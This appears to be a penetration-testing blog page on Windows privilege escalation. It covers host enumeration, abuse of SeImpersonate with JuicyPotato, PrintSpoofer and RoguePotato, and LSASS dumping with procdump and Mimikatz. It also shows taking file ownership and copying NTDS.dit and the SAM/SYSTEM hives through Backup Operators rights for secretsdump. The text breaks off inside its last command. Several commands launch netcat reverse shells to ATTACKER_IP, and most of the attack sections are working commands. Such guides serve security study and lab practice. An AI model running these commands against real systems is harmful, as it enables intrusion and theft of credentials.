# Windows Privilege Escalation

As with the Linux operating system, a misconfigured Windows machine can allow an attacker to gain ```Administrator``` or ```NT AUTHORITY\SYSTEM``` rights. While the ```Administrator``` is a user on any Windows machine, ```NT AUTHORITY\SYSTEM```, often called ```SYSTEM```, is an account that has the most rights but to which you cannot log in with credentials.

> For reading purpose, I won't tell if we are using a ```CMD``` console when running a command but will display a command that uses ```Powershell``` like ```PS> COMMAND```.

## Network Information Gathering

### IPconfig

As for a Linux machine, we may want to check for the network of the machine. We can print information about its internet network with the command ```ipconfig``` :
```console
ipconfig /all
```
This will allow us to know if there is more than one network interface which can be leveraged to access a computer on a sub-network.

### ARP

We can use the ```arp``` command to check for other computers on the network like this :

```console
arp -a
```

### Routing Table

The routing table can show us what routes can packages take on the network :

```console
route print
```

### Netstat

The ```netstat``` command can show us if there is any service running on the machine that may be leveraged :

```console
netstat -ano
```

### Windows Defender & AppLocker Rules

To display information about ```Windows Defender``` or the ```AppLocker``` rules we can run the followinf commands :
```console
PS > Get-MpComputerStatus
```
```console
PS > Get-AppLockerPolicy -Effective | select -ExpandProperty RuleCollections
```

## Basic Enumeration

It's important to have information about the computer we are attacking. Like on Linux, we can, for example, list the running processes with the ```tasklist``` command :

```console
tasklist /svc
```

### System information

We can list environment variables with the ```set``` command. With the ```systeminfo``` we can get a lot of information about the computer we are in like the host name, the OS Version, the type of processor used...

To see if a machine is up to date, we can look to its ```hotfixes``` with the following command and by checking the Microsoft website:
```console
wmic qfe
```
or
```console
PS > Get-HotFix | ft -AutoSize
```

#### Program installed

We can check for non-standard applications that may have been installed by a user or an administrator :

```console
wmic product get name
```
or
```console
PS > Get-WmiObject -Class Win32_Product |  select Name, Version
```

#### RPC

A user can connect to a machine with the RPC protocol. We can look if another user is connected on our machine with the ```query user``` command. If you want to know how to impersonate this user check [this part of my blog](https://nouman404.github.io/Notes/Footprinting/Common_Services_Enumeration_&_Attacks#rdp-session-hijacking).

### Current User Privileges

When we arrive on a machine we may want to know which user we are or what are our rights. To check our user we can use the ```whoami``` or the ```echo %USERNAME%``` command. To see which rights our user has we can run the command ```whoami /priv``` and if we are a classic user we may get this output.

```console
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled
```

> As you can see, we have some privileges that are disabled. You can enable them all using [this script](https://www.powershellgallery.com/packages/PoshPrivilege/0.3.0.0/Content/Scripts%5CEnable-Privilege.ps1) or [this one](https://raw.githubusercontent.com/fashionproof/EnableAllTokenPrivs/master/EnableAllTokenPrivs.ps1). First enable the script ```Import-Module .\EnableAllTokenPrivs.ps1``` and then run it ```.\EnableAllTokenPrivs.ps1```.
{: .prompt-tip }

We may want to check which group we are in because we can inherit privileges from certain.

```console
whoami /groups
```

We may also want to look for other users with the ```net user``` command or the list of all groups with this ```net localgroup``` command. To get information about a certain group you can use ```net localgroup GROUP_TO_CHECK```.


## Exploit User Rights

### SeImpersonate & SeAssignPrimaryToken

Every process in Windows has a token that contains details about the account that is operating it. Since these tokens are merely memory addresses that can be brute-forced by users who are unable to access memory, they are not thought of as secure resources. The ```SeImpersonate``` privilege is required to use the token. Only administrator accounts are granted access to it, and in most circumstances, it can be taken away during system hardening.

We are going to use [JuicyPotato](https://github.com/ohpe/juicy-potato) that can be used to exploit the ```SeImpersonate``` or ```SeAssignPrimaryToken``` privileges via DCOM/NTLM reflection abuse. Start a netcat listener on your attacker machine and then launch this command :

```console
c:\tools\JuicyPotato.exe -l 53375 -p c:\windows\system32\cmd.exe -a "/c c:\tools\nc.exe ATTACKER_IP ATTACKER_PORT -e cmd" -t *
```

> You may get issues if you don't put the full path of a file.
{: .prompt-tip }

> Note that we are using a ```cmd``` reverse shell but we can of course use ```powershell``` instead.
{: .prompt-info }

> If you are not running the exploit from a running process like an SQL server. You may need to add the ```-c``` flag. The add a value, depending on the machine you are on, from [here](https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md). If the first value doesn't work try the second, then the third... until it works.
{: .prompt-warning }

Where [JuicyPotato](https://github.com/ohpe/juicy-potato) doen't work ```Windows Server 2019``` and ```Windows 10 build 1809``` onwards, [RoguePotato](https://github.com/antonioCoco/RoguePotato) and [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) do work.

```console
c:\tools\PrintSpoofer.exe -c "c:\tools\nc.exe  ATTACKER_IP ATTACKER_PORT -e cmd"
```

or

```console
c:\tools\RoguePotato.exe -r ATTACKER_IP -e "c:\tools\nc.exe  ATTACKER_IP ATTACKER_PORT -e cmd" -l LISTENING_PORT
```

> Note that we are using a ```cmd``` reverse shell but we can of course use ```powershell``` instead.
{: .prompt-info }

### SeDebugPrivilege

Instead of adding the account to the administrators group, a user may be given the ```SeDebugPrivilege``` to run a specific program or service or help with troubleshooting. To leverage this privilege we can dump process memory. The ```Local Security Authority Subsystem Service``` (LSASS) process is a good target. We can do it with the GUI or with the command line. With the GUI, you will need to launch the ```Task Manager```, go to the ```Details``` section and find the ```lsass.exe``` process. When found, you can right click on it and select ```Create dump file```. The command for the command line is :

```console
procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

Now that we have the lsass dump (```lsass.dmp```), we can run [Mimikatz](https://www.kali.org/tools/mimikatz/) (you can also use the [github repo](https://github.com/ParrotSec/mimikatz)).

```console
mimikatz.exe
```

When on Mimikatz, we will try to dump password hashes :

```console
mimikatz # log
Using 'mimikatz.log' for logfile : OK

mimikatz # sekurlsa::minidump lsass.dmp
Switch to MINIDUMP : 'lsass.dmp'

mimikatz # sekurlsa::logonpasswords

<SNIP>
```


### SeTakeOwnershipPrivilege


The ```SeTakeOwnershipPrivilege``` policy setting determines which users can take ownership of any securable object in the device, including Active Directory objects, NTFS files and folders, printers, registry keys, services, processes, and threads.

First we can check who has the ownership of the file we are targeting :

```console
PS > Get-ChildItem -Path 'C:\Users\bob\Desktop\Secret_Data.txt' | select name,directory, @{Name="Owner";Expression={(Get-ACL $_.Fullname).Owner}}
```

If there is no name on the ```Owner``` section, you can look a the owner of the directory where the file is located with the ```dir /q``` command. Now we can take the ownership :

```console
PS > takeown /f 'C:\Department Shares\Private\IT\cred.txt'
```

If we still can't read the file, we can use the ```icacls``` command to change its Access Control Lists (ACL) :

```console
icacls 'C:\Users\bob\Desktop\Secret_Data.txt' /grant OUR_USER:F
```

This command will grant us full access (```F```) to the file.

## Exploit Groups Permissions

Just like the user privileges, groups allow you to do things that a normal user may not be able to do. To see in which group we are in you can use the command ```whoami /groups```.

### Backup Operators

When member of this group, we are granted the ```SeBackup``` and ```SeRestore``` rights. ```SeBackupPrivilege``` allows file content retrieval, even if the security descriptor on the file might not grant such access. A caller with ```SeBackupPrivilege``` enabled obviates the need for any ACL-based security check.

Because we can't use the standard ```copy``` command, we can use a program to copy files or just use the following [PoC](https://github.com/giuliano108/SeBackupPrivilege). As the Github states, we need to import the two ```dll``` in ```Powershell``` :

```console
PS > Import-Module .\SeBackupPrivilegeUtils.dll
PS > Import-Module .\SeBackupPrivilegeCmdLets.dll
```
To check if the ```SeBackupPrivilege``` is enabled, we can use either the ```woami /priv``` or the ```PS > Get-SeBackupPrivilege``` command. If the privilege isn't enabled, we can use the following command to enable it :

```console
PS > Set-SeBackupPrivilege
```

Imagine that we can't read the content of the ```Secret_Data.txt``` on the bob desktop. We can use this command to copy it to a location where we have read rights.

```console
PS > Copy-FileSeBackupPrivilege 'C:\Users\bob\Desktop\Secret_Data.txt' .\Secret_Data.txt
```

### Attacking Domain Controler (NTDS.dit)

This group also permits local domain controller logins. Given that it stores the NTLM hashes for all user and computer objects in the domain, the active directory database ```NTDS.dit``` makes for an extremely appealing target. However, unprivileged users cannot access this file since it is locked.

The [diskshadow](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow) command allows us to create a shadow copy of the ```C:``` drive.

```console
PS > diskshadow.exe
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

Now if you try to list the directories of the ```E:``` drive, you will see the same tree structure as in the ```C:``` drive.
The ```Copy-FileSeBackupPrivilege``` cmdlet allows us to bypass ACL and copy the NTDS.dit wherever we want :

```console
PS > Copy-FileSeBackupPrivilege E:\Windows\NTDS\ntds.dit C:\Users\Public\Downloads\ntds.dit
```

> You also use tools to extract the ```ntds.dit``` file like robocopy :  ```robocopy /B E:\Windows\NTDS .\ntds ntds.dit```
{: .prompt-tip }

We can now export ```SAM``` and ```SYSTEM``` registery hives and try to crack local user passwords. First we need to export these hives :

```console
reg save HKLM\SYSTEM SYSTEM.SAV
```
```console
reg save HKLM\SAM SAM.SAV
```
Now that we have the ```SAM``` and ```SYSTEM``` registery hives, we can extract all AD account credentials using tools such as ```secretsdump.py``` or the PowerShell [DSInternals](https://github.com/MichaelGrafnetter/DSInternals/blob/master/Src/DSInternals.PowerShell/DSInternals.psd1) :

1. **DSInternals**

```console
PS > Import-Module .\DSInternals.psd1
PS > $key = Get-BootKey -SystemHivePath .\SYSTEM
PS > Get-ADDBAccount -DistinguishedName 'CN=administrator,CN=users,DC=inlanefreight,DC=local' -DBPath .\ntds.dit -BootKey $key
<CREDS>
```

2. **Secretsdump**

```console
secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
